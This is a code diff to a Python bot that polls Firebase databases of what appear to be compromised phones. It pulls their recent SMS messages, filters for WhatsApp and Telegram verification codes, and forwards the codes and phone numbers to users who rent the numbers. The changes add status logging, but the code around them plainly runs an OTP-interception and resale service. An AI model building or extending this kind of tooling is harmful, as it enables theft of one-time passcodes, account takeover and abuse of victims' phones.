@@ -29,6 +29,7 @@ async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id, phone_numb
     except Exception: pass
 
 async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_number, service_filter):
+    db.set_bot_status("Fast Scanner", f"Checking messages for {dev_id[:8]}...")
     url = f"{fb_url}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5"
     msgs = await fbu.fetch_fb(url, auth)
     if not msgs: return last_msg_id
@@ -48,7 +49,6 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                 detected_service = fbu.extract_service_name(text, sender)
                 text_lower = text.lower()
                 
-                # 🚨 STRICT FILTER: WhatsApp / Telegram / Business
                 if service_filter == "whatsapp":
                     if "whatsapp" not in text_lower and not re.search(r'code[:\s]+\d{3}-\d{3}', text_lower):
                         continue
@@ -58,6 +58,7 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
                         continue
                     detected_service = "Telegram"
                 
+                db.set_bot_status("Fast Scanner", f"🚨 OTP Found! {detected_service} for {phone_number}")
                 for uid in users:
                     await send_otp_to_user(bot, uid, detected_service, otp, text, dev_id, phone_number)
         
@@ -100,8 +101,12 @@ async def start_scanner(bot):
                                 leases[uid]["last_msg_id"] = results[idx]
                                 updated = True
                 if updated: db.save_data(d)
+            else:
+                db.set_bot_status("Fast Scanner", "Idle (No active leases)")
+                
             await asyncio.sleep(1.0)
         except Exception as e:
+            db.set_bot_status("Fast Scanner", f"Error: {str(e)[:30]}")
             log.error(f"Scanner error: {e}")
             await asyncio.sleep(1.0)
 
@@ -117,6 +122,7 @@ async def whatsapp_scanner(bot):
             for i in range(0, len(fbs), 5):
                 chunk = fbs[i:i+5]
                 for fb in chunk:
+                    db.set_bot_status("WA Scanner", f"Fetching clients from base...")
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                     if not clients or not isinstance(clients, dict): continue
                     
@@ -125,6 +131,7 @@ async def whatsapp_scanner(bot):
                         is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000)
                         
                         if is_online:
+                            db.set_bot_status("WA Scanner", f"Checking {dev_id[:8]} for WhatsApp codes...")
                             msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                             if not msgs_dict: continue
                             
@@ -134,7 +141,6 @@ async def whatsapp_scanner(bot):
                             latest_id = 0
                             for m in msgs:
                                 txt = (m.get("message") or "").lower()
-                                # 🚨 WhatsApp aur WhatsApp Business dono catch karega
                                 if "whatsapp" in txt or re.search(r'code[:\s]+\d{3}-\d{3}', txt):
                                     has_ws = True
                                     mid = int(m.get("id", 0))
@@ -144,7 +150,6 @@ async def whatsapp_scanner(bot):
                                 best_nums = fbu.extract_best_numbers(c, msgs)
                                 if best_nums:
                                     num = best_nums[0][0]
-                                    # 🚨 REAL DATA: Battery & Health
                                     real_battery = str(c.get("battery", "0")).replace("%", "")
                                     real_health = fbu.calculate_health(msgs)
                                     
@@ -155,12 +160,14 @@ async def whatsapp_scanner(bot):
                                         "time": int(now), "sort_id": latest_id
                                     }
             
+            db.set_bot_status("WA Scanner", f"✅ Saved {len(ready_lines)} WA lines in DB. Sleeping 60s...")
             d = db.load_data()
             d["whatsapp_ready_lines"] = ready_lines
             db.save_data(d)
             log.info(f"Updated {len(ready_lines)} WhatsApp ready lines in DB.")
             
         except Exception as e:
+            db.set_bot_status("WA Scanner", f"Error: {str(e)[:30]}")
             log.error(f"WA Scanner error: {e}")
         await asyncio.sleep(60)
 
@@ -172,6 +179,7 @@ async def backup_scanner(bot):
             fbs = d.get("firebases", [])
             if fbs:
                 all_devs = []
+                db.set_bot_status("Backup Scanner", "Fetching all devices...")
                 for fb in fbs:
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
                     if clients and isinstance(clients, dict):
@@ -185,6 +193,7 @@ async def backup_scanner(bot):
                 
                 random.shuffle(missing)
                 for fb, dev_id in missing[:10]:
+                    db.set_bot_status("Backup Scanner", f"Extracting number for {dev_id[:8]}...")
                     msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                     dev_data = await fbu.fetch_fb(f"{fb['url']}/clients/{dev_id}.json", fb.get("auth"))
                     if msgs and isinstance(msgs, dict) and dev_data and isinstance(dev_data, dict):
@@ -199,6 +208,7 @@ async def backup_scanner(bot):
                     for dev_id in list(d["device_backups"].keys()):
                         if now - d["device_backups"][dev_id].get("time", 0) > 172800: del d["device_backups"][dev_id]
                 db.save_data(d)
+                db.set_bot_status("Backup Scanner", "Backup loop done. Sleeping 10s...")
 
             timers = d.get("upcoming_timers", {})
             now = int(time.time())
@@ -223,5 +233,6 @@ async def backup_scanner(bot):
             
             await asyncio.sleep(10)
         except Exception as e:
+            db.set_bot_status("Backup Scanner", f"Error: {str(e)[:30]}")
             log.error(f"Backup Scanner error: {e}")
             await asyncio.sleep(10)
